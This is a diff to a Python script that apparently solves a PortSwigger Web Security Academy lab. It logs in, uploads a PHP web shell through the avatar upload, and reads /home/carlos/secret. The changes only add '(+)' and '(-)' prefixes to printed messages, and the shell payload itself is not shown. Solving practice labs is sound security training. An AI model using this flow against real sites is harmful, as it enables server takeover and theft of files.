@@ -26,11 +26,11 @@ def get_cookie(url):
 
 
     except IndexError:
-        print("Cookie not found in the response, check your url and try again.")
+        print("(-) Cookie not found in the response, check your url and try again.")
         sys.exit(1)
 
     except requests.exceptions.RequestException as e:
-        print(f"An error has occurred: {e}")
+        print(f"(-) An error has occurred: {e}")
         sys.exit(1)
 
 
@@ -59,17 +59,17 @@ def execute_command(url, cookie):
 
 def main():
     if len(sys.argv) != 2:
-        print(f"Usage: python3 {sys.argv[0]} <url>")
-        print(f"Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
+        print(f"(+) Usage: python3 {sys.argv[0]} <url>")
+        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
         sys.exit(1)
 
     url = sys.argv[1].rstrip('/')
-    print("Logging in...")
+    print("(+) Logging in...")
     cookie = get_cookie(url)
-    print("Uploading webshell.php...")
+    print("(+) Uploading webshell.php...")
     upload_file(url, cookie)
-    print(f"Web shell has been uploaded here: {url}/files/avatars/webshell.php")
-    print("The contents of the /home/carlos/secret file: ", end='')
+    print(f"(+) Web shell has been uploaded here: {url}/files/avatars/webshell.php")
+    print("(+) The contents of the /home/carlos/secret file: ", end='')
     execute_command(url, cookie)
 
 
